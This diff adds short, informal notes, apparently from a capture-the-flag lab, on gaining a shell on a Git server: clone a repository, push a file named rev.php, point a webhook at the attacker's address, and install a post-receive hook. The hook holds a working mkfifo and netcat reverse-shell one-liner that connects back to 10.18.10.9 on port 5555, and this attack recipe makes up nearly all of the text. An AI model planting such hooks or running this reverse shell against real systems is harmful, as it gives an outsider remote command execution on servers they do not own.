@@ -1,0 +1,18 @@
+clone the repo first like
+
+```
+http://10.10.178.85:31111/leeroy/jenkins
+it will ask for username and password for thespecific user 
+then it will clone it
+now make a file in that directory and add it 
+git add rev.php && git commit -m "Exploiting" && git push -u origin master
+it will give error like username not found 
+type this line git config --global user.name "ScarryParrot"
+now before this make a new webhook and set target url to http://10.18.10.9 and trigger on : all events
+and also change git hooks to post-receive 
+and add
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.18.10.9 5555 >/tmp/f
+```
+
+now wil get a shell on port 5555
